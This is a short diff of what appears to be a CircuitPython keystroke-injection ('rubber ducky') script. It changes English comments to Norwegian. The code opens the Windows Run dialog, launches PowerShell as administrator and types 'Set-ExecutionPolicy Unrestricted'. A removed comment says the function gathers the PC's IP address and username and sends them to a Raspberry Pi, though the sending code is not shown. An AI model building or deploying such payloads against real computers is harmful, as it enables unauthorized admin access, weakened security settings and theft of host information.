@@ -52,13 +52,12 @@ duckyCommands = {
 
 }
 
-# Runs powershell as admin, gets ip-address and username of Windows pc, then sends info to raspberry pi
 def runPowershellCommand():
-    # Open Run
+    # Åpne dialogboksen "Kjør"
     kbd.press(Keycode.GUI, Keycode.R)
     kbd.release_all()
-    time.sleep(0.5)  # wait for the Run dialog to open
-    # Run powershell as admin
+    time.sleep(0.5)
+    # Åpne PowerShell som administrator
     layout.write('powershell')
     kbd.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
     kbd.release_all()
@@ -70,6 +69,7 @@ def runPowershellCommand():
     kbd.release_all()
     time.sleep(3)
 
+    # Endre ExecutionPolicy som administrator
     layout.write('Set-ExecutionPolicy Unrestricted')
     kbd.press(Keycode.ENTER)
     kbd.release_all()
